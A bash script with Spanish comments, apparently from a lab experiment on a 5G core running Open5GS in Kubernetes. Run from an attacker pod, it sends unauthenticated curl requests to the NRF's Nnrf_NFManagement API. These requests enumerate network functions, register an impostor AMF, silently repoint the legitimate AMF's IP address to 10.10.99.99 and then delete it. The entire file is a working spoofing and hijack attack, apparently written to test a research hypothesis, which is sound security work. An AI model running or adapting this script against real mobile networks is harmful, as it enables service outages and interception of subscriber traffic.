#!/bin/bash
# run_a2_sbi_spoofing_external.sh
# Vector A2 -- SBI spoofing externo sobre el NRF.
# Adversario externo ejecuta las cuatro operaciones CRUD de la API
# Nnrf_NFManagement (3GPP TS 29.510) sin autenticacion. Valida HE1.
#
# Requiere: UUIDs de NF legitimas obtenidos en la fase de reconocimiento
# de A1 (variable AMF_UUID mas abajo).
#
# Ejecutar dentro del pod atacante:
#   kubectl exec -it attacker-ue-lateral -n 5g-ran -- /bin/bash

set -uo pipefail

CONDICION="${1:?Uso: run_a2_sbi_spoofing_external.sh <C0|C1>}"
NRF_URL="http://open5gs-cp-nrf-sbi.5g-cp.svc.cluster.local:7777"
LOG="a2_${CONDICION}.txt"
AMF_UUID="${AMF_UUID:?Definir AMF_UUID con el nfInstanceId legitimo del AMF}"

echo "=== A2 -- Condicion: ${CONDICION} | $(date -u) ===" | tee "$LOG"

echo "--- OPERACION 1: READ ---" | tee -a "$LOG"
curl -v --max-time 5 --http2-prior-knowledge \
  "${NRF_URL}/nnrf-nfm/v1/nf-instances" 2>&1 \
  | grep -E "< HTTP|stream" | tee -a "$LOG"

echo "--- OPERACION 2: CREATE (PUT AMF impostor) ---" | tee -a "$LOG"
cat > /tmp/amf_impostor.json <<'EOF'
{
  "nfInstanceId": "ffffffff-aaaa-bbbb-cccc-000000000001",
  "nfType": "AMF",
  "nfStatus": "REGISTERED",
  "ipv4Addresses": ["10.10.99.99"],
  "amfInfo": {
    "amfSetId": "001",
    "amfRegionId": "01",
    "guamiList": [{"plmnId": {"mcc": "999", "mnc": "70"}, "amfId": "020040"}]
  }
}
EOF
curl -v --max-time 5 --http2-prior-knowledge -X PUT \
  "${NRF_URL}/nnrf-nfm/v1/nf-instances/ffffffff-aaaa-bbbb-cccc-000000000001" \
  -H "Content-Type: application/json" \
  -d @/tmp/amf_impostor.json 2>&1 \
  | grep -E "< HTTP|Location" | tee -a "$LOG"

echo "--- OPERACION 3: UPDATE (PATCH secuestro silencioso) ---" | tee -a "$LOG"
curl -v --max-time 5 --http2-prior-knowledge -X PATCH \
  "${NRF_URL}/nnrf-nfm/v1/nf-instances/${AMF_UUID}" \
  -H "Content-Type: application/json-patch+json" \
  -d '[{"op":"replace","path":"/ipv4Addresses/0","value":"10.10.99.99"}]' 2>&1 \
  | grep -E "< HTTP" | tee -a "$LOG"

echo "--- OPERACION 4: DELETE ---" | tee -a "$LOG"
curl -v --max-time 5 --http2-prior-knowledge -X DELETE \
  "${NRF_URL}/nnrf-nfm/v1/nf-instances/${AMF_UUID}" 2>&1 \
  | grep -E "< HTTP" | tee -a "$LOG"

echo "Timestamp cierre A2 ${CONDICION}: $(date -u)" | tee -a "$LOG"
